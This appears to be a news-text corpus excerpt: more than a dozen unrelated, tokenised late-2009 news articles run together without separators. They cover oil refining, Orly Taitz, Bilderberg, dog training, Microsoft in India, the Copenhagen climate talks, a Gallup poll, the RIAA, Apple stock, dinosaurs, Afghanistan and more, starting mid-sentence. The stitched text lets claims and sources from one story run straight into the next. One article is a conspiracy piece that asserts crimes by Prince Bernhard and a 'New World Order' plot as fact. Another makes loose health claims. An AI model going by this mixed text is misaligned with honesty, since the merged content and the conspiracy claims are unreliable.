Luan then left the top spot in China 's National Space Administration , where he lead the highly successful development and flight of Chang'e 1 , China 's first lunar orbiter .
Only a few years ago , a cry went up that the United States needed more oil refineries .
The perceived shortage was so acute that George W. Bush , president at the time , even offered disused military bases as sites for building them .
Not only did that never come to pass , but the reverse is now happening .
The business of oil refining is mired in a deep crisis , with five refineries having shut down this year , including plants in Delaware , New Jersey , California and New Mexico .
Gasoline demand , which many analysts had long expected to keep rising for decades , is down sharply in the recession .
And refiners are increasingly convinced that even after the economy recovers , demand will not grow much in coming years because of the rise of alternative fuel supplies and the advent of tougher efficiency standards for automobiles .
The recent closings signal the end of a period from roughly 2004 to 2008 , when demand soared , refineries operated near capacity and profits swelled .
For drivers , that meant gasoline prices at $ 3 or $ 4 a gallon , especially when hurricanes knocked out refining capacity on the Gulf Coast .
For refiners , this gilded period turned out to have been an anomaly .
It may be time to stand up to the long entrenched tyranny of sleeves .
Or something like that .
Attorney / dentist Orly Taitz — whose crusade against the legitimacy of President Barack Obama ’s birth certificate earned her marginal fame in 2009 — appears to be at her wit ’s end .
Responding to a fan ’s post to her Web site , Taitz highlighted both her opinion of the U.S. government and her prowess with the English language , claiming that now is the time for citizens to “ bare arms . ”
ADVERTISEMENT
She likely meant “ bear ” arms , as in , to carry , convey , deliver or fetch .
But that ’s beside the point .
Taitz ’s full passage reads : “ Seeing targeted destruction of our economy , our security , dissipation of American jobs , massive corruption in the Government , Congress Department of Justice and Judiciary , it might be time to start rallies and protests using our second amendment right to bare arms and organise in militias . ”
To put that in a complete sentence : the de-facto leader of the birther movement wants armed people to organize against the government .
Unless she truly meant going sleeveless , Taitz is a little late to that party .
As though to make her December even worse , a longtime friend and so - called “ law clerk ” by the name of Charles Lincoln confessed his love for Taitz and accused her of “ treachery ” in a lengthy blog posted last week .
The disbarred attorney tore into Taitz , who is married , for allegedly mishandling the conspiratorial legal filings against the president .

“ Orly ’s lack of judgment in the handling of our relationship exactly paralleled her lack of judgment in handling the constitutional eligibility litigation , ” he wrote .
“ She needed me and probably still needs me in every possible way , but I do n’t have her husband ’s money and so she chose to DUMP me , to DUMP real love , for the illusion of piles of federal reserve notes and other credits , and she goes on with her reckless rage and fire . ”
“ Read the whole thing , and understand why I ’ve been less concerned with Taitz than with the elected Republicans who have been willing to jump on board with this conspiracy , ” quipped David Weigel in a post to The Washington Independent .
Earlier in December her appeal of the eligibility litigation was once again shot down by a U.S. district judge , who criticized Taitz for repeating the same arguments he had previously rejected .
She was additionally fined $ 20,000 in October for repeated , frivolous court filings .

The life of Prince Bernhard von Lippe - Biesterfeld is littered with examples of weapons - trade , racketeering , bribery , plundering third world countries - and every other criminal activity under the sun .
As a recently published book in the Netherlands reveals , the prince was also in the coup d’état business .
The publication ‘ HRH : High Stakes at the Court of His Royal Highness ‘ by historian Harry Veenendaal and journalist Jort Kelder reveals that Bilderberg - founder prince Bernhard in 1950 attempted to oust the democratically elected government of Indonesia and place himself at the head of the Islands as viceroy .
After careful investigation of both archived diaries of a court secretary and military police reports , the authors come to the conclusion that the prince coordinated the attempted coup d’état with the help of his cronies in the military .
The trail of paper finally led the authors to multiple independently written statements from different sources confirming that the Bilderberg - founder had indeed set his sights on the islands , and for himself a coronation to become viceroy in the example of Lord Mountbatten ’s viceroy - ship of India during the late 40s .
A letter from the prince to general Douglas MacArthur , quoted in the book , reveals that Bernhard envisioned himself ruling over his feudal slaves as a genuine Napoleon .
Although by 1950 the former Dutch colony had already broken free from the stranglehold of colonialism , Bernhard and his buddies obviously desired another round of plunder , securing for themselves the rich natural resources embedded in the islands .
History would have it otherwise .
The coup proved a miserable failure .
But Bernhard , being a back - door power broker , would not relent .
When he co-founded the Bilderberg group in 1954 he spun his web in such a way that the fat flies would be captured anyway .
When the major Dutch captains of industry saw their interests in Indonesia under threat , they used their contacts with Bernhard at the annual Bilderberg meetings to secure them .
The prince learned his lesson after this failed attempt at overthrowing a government .
Not by directly coordinating the violent overthrow nor leaving a clear trail would he accomplish such feats in the future .
His Bilderberg adventures showed him that he should instead muster all willing governments and business - leaders towards an entangling alliance if the world government would be accomplished .
A d v e r t i s e m e n t
This is exactly what he labored towards in the next 40 to 50 years .
Under the guise of environmentalism , the prince founded the 1001 club in 1970 with the aim of raising funds for the World Wildlife Fund ( of which Bernhard was the first chairman , and top - eugenicist Julian Huxley was the founding father ) .
Now , with Copenhagen in full swing , we are seeing exactly what the elitist environmental movements have worked towards : the creation of a global Leviathan .
Not by openly routing nation - states would the global designs of the New World Order be accomplished ( which would after all only incite uprisings and rebellion ) , but rather by sneaking in through the United Nations , World Bank and other tentacles of global governance .

Comment on this article
Source :
A few months ago the Journal of Applied Animal Behaviour Science published an article titled Survey of the use and outcome of confrontational and non-confrontational training methods in client - owned dogs showing undesired behaviors " .
Two of the researchers participated in the research regarding children and dog bites that I wrote about earlier , so I decided to plunk down my $ 31.50 and read it for myself .
Similar to the research on canine aggression directed toward children , the researchers had access to people seeking helping from a veterinary behavioral service .
This time , rather than examining records , surveys were distributed to families requesting information about the methods that had been used prior to common to the veterinarian and whether they had a positive , negative , or no , effect on the dog 's behavior .
The survey also asked whether aggressive behavior was seen in association with the particular method .
One hundred forty surveys were completed in one year 's time .
In analyzing methods the researchers broke them down into four broad areas : direct confrontation , indirect confrontation , reward - based training , and neutral .
The takeaway from the research has been discussed in quite a few places already on the Internet ; confrontational behavior modification techniques can result in aggressive responses from dogs .
The specifics however , had some very interesting points .
Sixty of the participants reported trying to use " alpha rolls " or " dominance downs . "
Eighteen of them - that 's 30 % - said that the technique resulted in an aggressive response .
Twenty - eight of the participants reported hitting or kicking their dogs .
Twelve of them reported an aggressive response .
That 's 43 % !
Twenty - seven participants used scruff shakes or grabbed their dog 's jowls .
26 % reported an aggressive reaction .
Fifty - three used a " stare - down , " sixteen of which ( 30 % ) reported an aggressive response .
Fifty - one used a spray bottle .
Ten of them reported an aggressive response .
( That 's 20 % ) .
Needless to say , some commonly used aversive methods come with a bit of risk .
Now , compare those numbers to these :
One hundred twenty - four reported using food rewards .
Two reported an aggressive response .
One hundred and one reported trying increased exercise .
None reported an aggressive response .
One hundred and one reported having their dog sit for all desired items and activities .
Two reported an aggressive response .
As you might expect , non-confrontational methods infrequently elicit aggressive responses .
But here 's the real rub : the survey also asked families about the success rates for various techniques .
I do n't want to regurgitate too much more of the paper , as it risks violating the publisher 's rights , but here are some quick numbers :
Alpha Roll : 44 % effective , 25 % negative , 31 % no effect
Dominance Down : 48 % effective , 24 % negative , 28 % no effect
" Sit for everything " 85 % effective , 1 % negative , 14 % no effect
Increased Exercise : 69 % effective , 1 % negative , 30 % no effect
The reported 44 % - 48 % success rate with alpha rolls / dominance downs is rather interesting .
Going from no training at all to any training , regardless of the techniques and the degree of skill and consistency , is going to lead to some improvement .
Be careful when you dismiss methods that you dislike or even those that are outright inhumane : even an unprogrammed VCR is right twice a day .
Of course , this is a small sample and the observations are those of " average pet owners " but all things being equal , the word from the trenches is that non-confrontational methods are not just more effective but also less risky .
The Delhi High Court has fined Microsoft for harassing alleged software pirates by taking them to court in the national capitol , instead of the cities where the crimes had supposedly occurred .
According to the ruling , using money as a power tool is not condoned without repercussions .
To protect its intellectual property , Microsoft recently sued four software pirates who allegedly used the company ’s software without permission .
However , the outcome of this action was quite unexpected .
The Delhi High Court decided to fine the software giant , after it found out that the cases the company had initiated in India ’s capital were related to alleged copyright infringements that occurred in Bangalore , Hyderabad , Chandigarh and Mumbai .
According to the Court , Microsoft is needlessly abusing its unlimited cash flow as a power tool to financially hurt the defendants , who will have to travel all across the country in order to defend themselves .
This abuse of “ money power ” to “ harass ” defendants is unacceptable according to the Court .
“ When the constitution of India provides equality before law , this equality has to be all pervasive and cannot be allowed to be diluted because of money power or lobbying power , ” Judge Dhingra commented on the case .
Aside from the harassment angle , the Court found that Microsoft chose Delhi because the High Court can order compensation up to $ 40,000 for the alleged crimes .
However , instead of taking on the case directly , the court chose to fine Microsoft $ 4,000 for each of the four defendants instead .
If it turns out that the software piracy claims are unfounded , this money will go directly to the accused .
In addition , Microsoft was ordered to pay a local commissioner who will investigate the piracy claims .
Although it was not illegal for Microsoft to file the four cases in the national capital where the company is headquartered , the Court found that something had to be done to prevent shear abuse of power by the software giant .
“ On the strength of its money power it [ Microsoft ] has the added advantage of choosing a court of its own liking which is so far away from the defendant that it becomes problematic and a harassment for the defendant to contest the suit itself , ” the Delhi High Court ruling read .
COPENHAGEN --
Another day in the Danish capital , another day of climate change activists lambasting Canada ’s position -- this time with Toronto Mayor David Miller assuming the role of chief critic .
“ Like most Canadians , I ’m embarrassed .
I ’m embarrassed that our government continues to be one of the biggest obstacles to reaching agreement , ” Mr. Miller said moments before accepting two new “ Fossil of the Day ” awards on behalf of Canada .
“ I chose to come here to tell people that Canadians are acting despite the fact that Canada is n’t .
They ’re acting through their cities .
The mayor of Copenhagen and I have convened a summit of mayors here next week .
We have over 100 mayors .
Cities are doing incredible things .
Calgary ’s rapid transit is all powered by wind , and Canadians themselves , are acting in their own lives as well , and so are many provinces . ”
The tongue - in - cheek Fossil Awards are prizes given to countries seen as blocking progress at the United Nations climate summit .
They are judged by a coalition of environmental groups called the Climate Action Network -- about 10 % of which are Canadian organizations .
These two new Fossil awards , which were given based on comments made by federal Environment Minister Jim Prentice and Canada ’s chief negotiator Michael Martin , bring Canada ’s total to five ( one earlier award was a group award , won by Canada and eight other industrialized countries ) .
Canada has been criticized before and during the Copenhagen summit for what environmental groups perceive as weak emission - reduction targets , and what they say is its obstructionist role in the talks to find a new climate pact .
Canada also has been targeted for failing to meet its Kyoto commitments , instead seeing its greenhouse gas emissions increase between 1990 and 2007 .
Addressing a large crowd Friday , Mr. Miller said he wanted to speak on behalf of Canadians .
“ Canadians are environmentalists , ” he said .
“ Canada should be a leader in these issues .
In Toronto , we are . ”
The two new Fossils were handed to Canada a day after Mr. Prentice told the National Post he was fed up with the antics of the Climate Action Network .
Speaking from London , Mr. Prentice said he is handing out his own awards in retaliation .
The minister said he would give the inaugural Hot Air of the Day award to the Pembina Institute , an environmental think - tank , for its “ tired and shopworn ” criticism of Ottawa ’s performance on the same day UN climate change chief Yvo de Boer said Canada has been “ negotiating very constructively ” in Copenhagen .
But on Friday , environmental activists struck at Canada ’s policies and oilsands industry again , publicizing letters from 11 members of the European Parliament , who are calling on oil companies to pull out of the oilsands in northern Alberta .
Hailing from countries such as Finland , France and the Netherlands , the European politicians wrote to executives at Shell , BP , Statoil and Total .
“ The environmental and health impacts of tar - sand extraction are huge , ” wrote MEP Kriton Arsenis of Greece .
“ In addition to being two to three times more carbon - intensive than the production of conventional oil , the process causes severe air and water pollution , destroys livelihoods of indigenous communities and produces toxic waste .
It is clear that this is not the way the energy companies should go .
Instead , they should focus on the clean energy sources that have broken growth records year after year , even during the current recession . ”
PRINCETON , NJ --
This Christmas season , 78 % of Americans identify with some form of Christian religion , a proportion that has been declining in recent decades .
The major reason for this decline has been an increase in the percentage of Americans claiming no religious identity , now at 13 % of all adults .
The trend results are based on annual averages of Gallup 's religious identity data in America that stretch back over 60 years .
One of the most significant trends documented during this period is the substantial increase in the percentage of American adults who do n't identify with any specific religion .
In 1948 , only 2 % of Americans did not identify with a religion .
That percentage began to rise in the late 1960s and early 1970s .
Eleven years ago , in 1998 , 6 % of Americans did not identify with a religion , a number that rose to 10 % by 2002 .
This year 's average of 13 % of Americans who claim no religious identity is the highest in Gallup records .
The percentage of Americans who identify as Catholic , Protestant , or some other non-Catholic Christian faith has been concomitantly decreasing over the years .
This suggests that one of the major patterns of religious transition in America in recent decades has been the shift from identification as Christian to the status of having no specific religious identification .
In 1948 , 91 % of Americans identified with a Christian faith .
Twenty years ago , in 1989 , 82 % of Americans identified as Christian .
Ten years ago , it was 84 % .
This year , as noted , 78 % of all American adults identify with a Christian faith .
There has also been a slight increase in the percentage of Americans who identify with a religion that is not specifically classified as Christian .
Sixty years ago , for example , 4 % of Americans identified with a non-Christian religion .
By 1989 , 9 % of Americans were in this non-Christian religion category , the same percentage as today .
Personal Importance of Religion
Does the decrease in religious identity signify that religion is losing its importance for Americans ?
There was a substantial drop in the percentage of Americans who said religion was " very important " in their lives between the 1960s and the 1970s -- from 70 % in 1965 to 52 % by 1978 -- but in recent decades , this " very important " percentage has remained relatively steady .
The overall figure today -- 56 % -- is slightly higher than it was 31 years ago .
" The percentage of Americans who in theory could celebrate Christmas this week as a specific component of their religious faith is down significantly from where it was 50 or 60 years ago . "
There has been a slight tendency over the years for Americans to shift from a " fairly important " category to the " not very important " category in answer to this religious importance question .
The percentage saying religion is not very important in their lives was routinely in the 12 % to 15 % range from 1978 through the early years of this decade .
In more recent years , this percentage has drifted slightly upward , and is at 19 % this year .
Church Membership
As would be expected , given the drop in the percentage of Americans who have a religious identity , there has been a similar drop in the percentage of Americans who say they are a member of a church or synagogue .
Gallup first asked this church membership question in 1937 , at which time 73 % of Americans said they were a member of a religious congregation .
That percentage stayed above 70 % in occasional Gallup surveys conducted through 1976 , and remained in the high 60 % range for the most part through the beginning of this decade .
In recent years , the church membership percentage has been drifting down , reaching as low as 61 % in Gallup 's averages for 2007 and 2008 .
This year 's average is 63 % .
Is Religion Old - Fashioned and Out of Date ?
Gallup has asked Americans over the years whether " religion can answer all or most of today 's problems " or whether it " is largely old - fashioned and out of date . "
The majority of Americans over the last 52 years have chosen the first of these responses .
The biggest change in attitudes on this measure came between Gallup 's survey in 1957 -- a very religious decade , based on Gallup indicators -- and the data collected in more recent decades .
The years from 1974 to the present have been marked by significant fluctuations in the answer to this question .
Generally speaking , the percentage of Americans saying that religion can answer all or most of today 's problems has been in a range between the mid-50s and the mid-60s .
The recent decade high point was 68 % in a survey conducted 10 years ago , in December 1999 .
The recent low point was 53 % in a survey conducted last December .
In two surveys conducted this year , the percentages saying that religion can answer all or most of today 's problems were 60 % and 57 % .
A considerable percentage of Americans over the years , when confronted by the two choices offered by this question , have replied that they can't choose or have another opinion .
This year , for example , 13 % and 15 % of Americans have given one of these answers in Gallup 's two surveys that included this question .
Bottom Line
The United States remains a dominantly Christian nation .
Almost 8 out of 10 Americans identify with a Christian religion .
And the vast majority of those who identify with any religion identify with one that is Christian .
Yet , the percentage of Americans who in theory could celebrate Christmas this week as a specific component of their religious faith is down significantly from where it was 50 or 60 years ago .
The most important reason for this shift is straightforward : there has been an increasing percentage of Americans who say they have no specific religious identity .
The fact that fewer Americans say they have a religious identity does not necessarily mean there has been a decrease in overall religiosity in America .
It is possible that some proportion of those who do n't identify with a specific religion are still personally or spiritually religious .
Although a little more than one out of five Americans do not identify with a Christian faith , the Christmas season has ramifications for a broader segment of society .
A Gallup survey conducted last year showed that 93 % of all American adults said they celebrated Christmas .
A federal judge on Monday finalized a $ 675,000 jury verdict against a defendant who went to trial after the Recording Industry Association of America sued him for file sharing .
U.S. District Judge Nancy Gertner presided over the Joel Tenenbaum case in summer 2009 .
Tenenbaum was only the nation 's second individual defendant not to settle with the RIAA before trial .
The judge also issued an injunction preventing the 25 - year - old Boston University student from file sharing .
Though Gertner said an injunction barring Tenenbaum from undertaking any more illegal file sharing was appropriate , she declined an RIAA request to censor Tenenbaum 's speech ( .pdf ) .
After the July verdict , in which he was found liable for infringing 30 songs , Tenenbaum promoted piracy and railed against the verdict , and the RIAA wanted the judge to quiet him .
" Although plaintiffs are entitled to statutory damages , they have no right to silence defendant 's criticism of the statutory regime under which he is obligated to pay those damages , " Gertner wrote .
" This court has neither the desire nor the authority to serve as the censor of defendant 's public remarks ( . pdf ) regarding online file sharing . "
Gertner also expanded on a pretrial ruling in which she declared Tenenbaum could not render a so - called " fair use " defense .
Tenenbaum claimed that his file sharing was not counter to the Copyright Act .
The act provides up to $ 150,000 in damages for each infringement , and the figures are left to jurors .
The only other accused file sharer to go to trial against the RIAA was Jammie Thomas - Rasset .
The RIAA won a whopping $ 1.92 million verdict against the Minnesota woman this summer for sharing 24 songs on Kazaa .
In the last six years , the RIAA has sued about 30,000 individuals for file sharing .
Most defendants have settled out of court .
The RIAA is winding down its litigation campaign against individuals , and is instead working with internet service providers to come up with plans that might lead to cutting off internet access for repeat , digital copyright scofflaws .
In the Tenenbaum case , the judge wrote Monday that Tenenbaum 's version of fair use was " so broad that it would swallow the copyright protections that Congress created , defying both statute and precedent . "
That ruling was a major blow to what was expected to be a key point of argument for the Berkman Center for Internet and Society , which represented Tenenbaum and is now seeking a new trial .
Ahead of the summer trial , Gertner precluded the fair - use defense with a brief order without much elaboration .
The judge gave the Berkman Center until Jan. 4 to seek a new trial .
Among other positions , Tenenbaum is also likely to argue that the damages were unconstitutionally excessive , according to Charles Nesson , Tenenbaum 's lead attorney .
" Applications of huge statutory damages to individual people to individual people like Joel is unconstitutional , " Nesson said in a telephone interview .
He said he would also ask the court to reduce the verdict to $ 22,500 – the minimum $ 750 per song allowed under the Copyright Act .
Thomas - Rasset is also challenging the constitutionality of her verdict .
A decision is pending before U.S. District Judge Michael Davis in Minnesota .
" We ’re pleased that the court has entered judgment that fully reflects the jury 's conclusion in addition to requiring Mr. Tenenbaum to destroy all illegal music files and refrain from further theft of our music , " RIAA spokeswoman Cara Duckworth said via e-mail .
Santa arrived early for Apple Inc. shareholders :
The stock surged $ 6.94 , or 3.4 % , on Thursday to close at a record high of $ 209.04 .
That topped the previous closing high of $ 207 on Nov. 17 .
The buzz continues to build about the company ’s widely anticipated -- albeit unconfirmed -- tablet computer .
The Financial Times reported that Apple has rented a stage at the Yerba Buena Center for the Arts in San Francisco in late January , most likely for a product announcement .
An Apple tablet , which some speculate might be called the “ iPad , ” is expected to be a cross between the iPhone , with its touch - sensitive screen and numerous useful applications , and the Amazon Kindle reading device , with its much larger screen .
But as the Financial Times notes , “ Apple has explored making tablet style devices for years , only to back off .
The company also has a history of scrapping products very close to their scheduled launch dates . ”

But Apple stock bulls , who have n’t been held back much by such caveats , figure something good is coming in January .
The shares now are up a massive 145 % year to date , more than making up for their plunge in the market meltdown of 2008 .
A share of Apple now costs about 27 times the average analyst forecast of the company ’s earnings per share for the fiscal year that ends next September .
That ’s expensive relative to the Standard & Poor ’s 500 index ’s average price - to - earnings ratio of about 15 based on 2010 earnings estimates .
But it ’s a far cry from the P / Es of tech ’s bubble days of the late 1990s .

Apple ’s stock market value now is $ 188 billion , which tops IBM Corp. ( $ 171 billion ) , General Electric Co. ( $ 164 billion ) and Chevron Corp. ( $ 155 billion ) , among others , and is closing in on Google Inc. ( $ 196 billion ) and Wal - Mart Stores Inc. ( $ 204 billion ) .
Besides the hype over the tablet , Apple is benefiting from Wall Street ’s strong appetite for tech stocks in general in 2009 .
And in a year like this , the rich tend to get richer as the calendar runs out :
Some money managers are probably buying hot tech stocks to dress up their portfolios for year - end statements to clients .
Other tech issues hitting new 52 - week highs Thursday : Google , Microsoft Corp. , IBM and Xilinx Inc .

Year to date , the tech - dominated Nasdaq is up 45 % to the S&P ’s 25 % gain .

Tyrannosaurus rex was an athletic , warm - blooded animal that jogged rather than lumbered around its territory , according to a new study .
Researchers led by Herman Pontzer at Washington University in St Louis examined the anatomical details of 14 dinosaurs of different sizes to work out how much energy the animals might have needed to move around .
He found that , for dinosaurs weighing from a few kilograms to tonnes , the power their muscles needed was far too high for the animals to have been cold - blooded .
" We found that the energy costs of locomotion for them , the amount of oxygen they'd have to consume to walk and run , would have far exceeded the rate of energy use that cold - blooded animals are able to sustain , " said Pontzer .
" This says they may well have been warm - blooded and , if so , we can't think of them as slow , lumbering reptiles any more . "
His results are published today in the journal PLoS ONE .
Scientists have been arguing since the 1950s over whether dinosaurs were warm or cold blooded , because each type of metabolism implies different physical attributes .
Cold - blooded animals , such as modern lizards , are heavily dependent on the temperature around them to stay active – so they are limited to living , for the most part , in relatively warm parts of the world and are only active during the day .
Warm - blooded animals , such as modern mammals and birds , can live anywhere and move around or hunt for food at any time of day .
Maintaining a stable internal temperature , however , costs a lot of energy and requires the animals to feed more regularly .
" If you take the classic view of dinosaurs being cold - blooded animals , they'd be limited in the same way as cold - blooded animals today , " said Pontzer .
" They would n't have been able to be successful in as many parts of the landscape , they would n't have been as active [ or ] have some of the same characteristics in terms of mental and physical capabilities as warm - blooded animals . "
If dinosaurs were warm blooded , it could explain their success in taking over large parts of the prehistoric world for hundreds of millions of years throughout the Triassic , Jurassic and Cretaceous periods .
Pontzer 's analysis grew out of an approach he had already developed for understanding and predicting movement costs in living animals .
His recent work had showed , for example , that the energy cost of walking and running was associated with leg length .
The distance from the hip joint to the ground predicted the observed energy cost of movement with 98 % accuracy for a wide variety of land animals .
" We want to understand how limb design determines the energy costs of walking and running .
Specifically the shape of the bones as well as the posture an animal uses dictates how much muscle they need to turn on every step to walk or run , " he said .
" It became obvious that these methods would be really applicable to dinosaurs so we took detailed anatomical models of these dinosaurs and we applied the methods . "
Hayley Price spent the stolen £ 41,000 on herself , her son and her dog A woman who stole £ 41,000 from her 95 - year - old war hero great - uncle has been ordered to pay back just £ 5 .
Hayley Price , 42 , of Blaenavon , Torfaen , cooked and cleaned for D - Day veteran Arthur Edwards , while writing herself 154 fraudulent cheques .
She was given a year 's jail , suspended for two years , at an earlier hearing at Cardiff Crown Court .
A proceeds of crime hearing was subsequently told all the money has been spent and Price had no assets .
Judge David Wynn Morgan ruled that Price must repay £ 5 to Mr Edwards by next week .
He had previously told her : " You did a wicked , wicked thing . "
Price 's trial heard she went shopping for her frail uncle and visited him every day for 11 years .
He will never see his money again and the fact that a member of his own family stole from him is very sad .
Niece Jayne Edwards
The court was told that during a police interview , she said : " I was greedy and had Christmas coming .
I hold my hands up to it .
I thought I could get away with it . "
The jury heard that all the money was spent on herself , her son and her dog .
She admitted 12 counts of forgery .
Mr Edwards , a corporal in the South Wales Borderers , won the Kings Medal for Gallantry for saving the life of a doctor during the D - Day landings in World War II .
After the proceeds of crime hearing on Wednesday , Mr Edwards ' family said it had been a " very difficult time " for the veteran soldier who now lives in a care home .
His niece Jayne Edwards said : " He will never see his money again and the fact that a member of his own family stole from him is very sad .
" I 'm disappointed for my uncle that the system does n't allow for him to get the money back . "

BOSTON — On Christmas Eve , 30 years ago Soviet tanks rolled into Afghanistan and began a 10 - year occupation that ended in humiliating defeat .
I recently came across a set of archival films from the Soviet invasion and the subsequent fighting in Afghanistan that dragged on and grew more and more bloody .
The images all looked so familiar .
The troops on patrol through Helmand ’s dusty plains and tanks burning in wreckage on the roads that wind through the dramatic terrain of the Hindu Kush .
And the wounded being evacuated and lining up in triage looking wrecked and haunted .
These days the Soviet uniforms have been replaced by U.S. and NATO uniforms , but the battered , questioning faces of the soldiers look the same then as they do now .
After 10 years of fighting the Afghans , the Soviet Union finally pulled out and learned a hard lesson about Afghanistan and its people and its history of resisting empires .
This resiliency is the central fact of Afghan history and it seems America — its military and diplomatic leadership — has made little effort to understand the lessons of history learned by those empires that went before them , particularly the Soviets .
For sure , all wars are different .
The Soviets invaded for different reasons on Dec. 24 , 1979 , than the U.S. did on Oct. 7 , 2001 , and the Soviets came with different intentions .
But the fight they fought — and lost — on the ground is very similar to the one the U.S. is fighting — and losing — on the ground right now .
Back then it was a battle to control the road network just as it is today .
The Soviets were crippled when insurgents cut off the supply lines .
The U.S. is suffering the same fate .
The strength of the anti-Soviet insurgency , which then was called the “ Mujahadeen , ” which the U.S. and Pakistan and Saudi Arabia supported to the tune of billions of dollars , controlled the remote villages just as the Taliban does today .
Back then the Soviets abandoned futile efforts to control the remote hamlets and focused on urban centers , just as Gen.
Stanley McChrystal has called for now that President Barack Obama has approved the surge of 30,000 troops , bringing the total U.S. troop presence to approximately 100,000 .
The Soviets eventually had some 400,000 troops in Afghanistan and they still never succeeded in controlling the country .
I reached Dmitri Trenin , an expert on military strategy , in Moscow by phone and asked him about these images and what lessons the Soviet experience has to offer in understanding Afghanistan .
Trenin , who is the director of Carnegie Moscow Center , served for more than 20 years in the Russian military during the time of the occupation of Afghanistan , and eventually taught at the war studies department at the Soviet Military Institute .
“ When the Soviet Union went into Afghanistan , it was not thinking about the exit .
It had a concept of what it wanted to bring to Afghanistan , and less of an idea of what Afghanistan wanted or even what it was all about .
The Soviets learned the hard way what Afghanistan was all about and that what they were offering the country did not want , ” Trenin said .
“ The U.S. is making the same mistake .
But they are also making some of their own unique mistakes .
They are not all the same mistakes as the Soviet Union , ” he said .
“ The U.S. is going to withdraw from Afghanistan , and it will leave without having accomplished the mission set by Bush to create a democratic state , ” said Trenin , referring to President George W. Bush .
“ In the end , the U.S. will leave Afghanistan not having done much to effect change in the country .
Afghanistan will change at its own pace , and that ’s the lesson empires learn in Afghanistan . ”
Elizabeth Gould , the co-author of the new book , " Invisible History : Afghanistan 's Untold Story , " says : “ The unlearned lesson of the Soviet invasion and subsequent occupation was that the Soviet Union was up against itself in Afghanistan , afraid to admit the failure of its mistaken adventure to its people , afraid of infiltration on its southern border and afraid it would look weak in the eyes of its chief adversary , the United States . ”
“ Afghanistan is not easy , ” added Gould , a journalist and author who has researched its history for the last 18 years along with co-author Paul Fitzgerald .
“ But Afghanistan is hardest on empires who cannot restrain themselves and who learn too late that it's not Afghanistan they 're fighting , but the image of their own vanity in the mirror . ”

It may take more muscles to frown than to smile - but being grumpy is better for you .
A new study into behavioural health has discovered people who are always crabbit are less gullible and better at decision making .
Psychology expert Professor Joseph Forgas revealed his startling results in this month 's Australian Medical Journal .
His findings show even the most negative emotions , such as sadness and grumpiness , can prove more valuable than happiness and other positive feelings .
But if being like Victor Meldrew can be better for you when it comes to making decisions , what can other emotions or behaviour do for you ?
GRUMPINESS
According to Prof Forgas , grumpy people make better eye witnesses , are harder to fool and will make better judgment calls than cheerier people .
He believes that a negative mood " triggers more attentive , careful thinking and we pay greater attention to the external world " .
SADNESS
Another part of Prof Forgas ' study compared the benefits of being sad to being happy .
He found that a sad person can cope with demanding situations better than a happy person because of the way mood affects the brain 's information processing systems .
One of the many tests Prof Forgas used to prove his theories involved asking happy and sad people to judge the merits of urban myths spouted in movies , and found that the sad ones were less likely to be conned .
SWEARING
It might not be big , clever , politically correct or polite but , according to scientists , unleashing a four - letter word outburst can be very good for your health .
A study at Keele University found that swearing helps us deal with pain and that potty - mouthed people can endure pain for 50 per cent longer than non-swearers .
FLIRTING
A cheeky nod or wink can be good for your health - it 's official .
Studies have shown an inoffensive flirt , even if you are not looking to follow it up , can be a great way to build confidence and reduce stress .
And as long as it is not intended or perceived as sexual harassment , studies have also shown it can improve office morale and camaraderie in stressful times .
GIGGLES
Laughter can be the best medicine and since 1995 a form of laughter yoga has been taught around the world to encourage the giggles .
It helps with heart health and is also effective in pain management , stress reduction and fighting depression .
GRINNING
A big cheesy grin may be quite off - putting to some but the widest kind of smile is also good for you , with some incredible benefits .
These include a drop in blood pressure , a boosted immune system and a reduction in stress .
It also helps produce endorphins , which relax the body , as well as the happy hormone serotonin .
CRYING
Letting go and having a good blub can be one of the best things for you .
Tears include a powerful hormone , leucine enkephalin , which regulates pain and other hormones which regulate stress .
So tears could be a physiological way for the body to reduce stress .
SHOUTING
A good scream is not only a good workout for the lungs but it is also good for the soul .
Primal Scream therapy , popularised in the 1970s and enjoyed by people such as John Lennon , uses shouting to connect to subconscious stresses and issues and get them out .
LAZINESS
People who get up early and busy themselves all day long are heading for an early grave , says public health expert Professor Peter Axt .
He believes lazing about is the key to a long life and an antidote to professional stress , provided people are otherwise healthy .
He says : " People who would rather take a midday nap instead of playing squash have a better chance of living into old age . "
ANNOYING THE NEIGHBOURS
Blasting out loud music is the best way to upset your neighbours but it can boost your brain power .
According to researchers at Manchester University music fans are stimulating part of the inner ear known as the sacculus , which responds to the beat in music .
This gives the brain pleasure and makes us feel good - during the music and afterwards .
FIDGETING
A fidgety work colleague can drive you mad but fidgets are actually keeping themselves slim .
A study in America found that people who constantly tap their fingers or twitch and stretch are using up an extra 350 calories a day .
Endocrinologist James Levine , who led the research , said : " There are huge differences in the amount of fidgeting between people who are lean and those who are obese . "
BEING UNTIDY
An unmade bed may appear to be the height of laziness but it could help prevent asthma .
Scientists at Kingston University found house dust mites - which can bring on an asthma attack - cannot survive in the dry exposed conditions found in an unmade bed .
BART is trying to determine what caused a train to derail Wednesday just south of the Oakland City Center / 12th Street Station .
Seventy - five passengers were aboard the Richmond - bound train when three of the four front wheels on the lead car jumped the tracks at 10:24 a.m. about 250 feet from the station , BART said .
Oakland firefighters helped lead the passengers on foot to the 12th Street station .
BART spokesman Jim Allison said two people required medical assistance , including a man who suffered a seizure .
Another BART spokesman , Linton Johnson , described the incident as " very minor " and said trains " go very slowly through that area . "
He said the train was probably going about 15 to 30 mph .
BART had no immediate explanation for why the train jumped the tracks .
James Rice III , 41 , of Oakland , said he was riding in the lead car when it began " jumping up and down " as soon as it left the Coliseum Station .
It did the same thing after it left the Fruitvale and Lake Merritt stations , Rice said , adding that the doors did n't seem to be working properly .
" It was moving side to side and up and down , " Rice said of the train .
" I thought it was going to jump the tracks .
I was wondering why they did n't stop it at Fruitvale or Coliseum and take us off the train . "
Rice said , " I 'm not angry , just surprised and shocked . "
He said he was getting himself checked out at a hospital because his neck was hurting .
The derailment caused delays of 10 to 15 minutes for much of the day on the Fremont - Richmond line , with trains detouring to the West Oakland station around the derailment site .
The derailed car was put back on the track at 1:45 p.m. and taken to BART 's Hayward service yard for inspection .
See related patient information handout on low back pain , written by the author of this article .
Acute low back pain is commonly treated by family physicians .
In most cases , only conservative therapy is needed .
However , the history and physical examination may elicit warning signals that indicate the need for further work - up and treatment .
These “ red flags ” include a history of trauma , fever , incontinence , unexplained weight loss , a cancer history , long - term steroid use , parenteral drug abuse , and intense localized pain and an inability to get into a comfortable position .
Treatment usually consists of non-steroidal anti-inflammatory agents or acetaminophen and a gradual return to usual activities .
Surgery is reserved for use in patients with severe neurologic deficits and , possibly , those with severe symptoms that persist despite adequate conservative treatment .
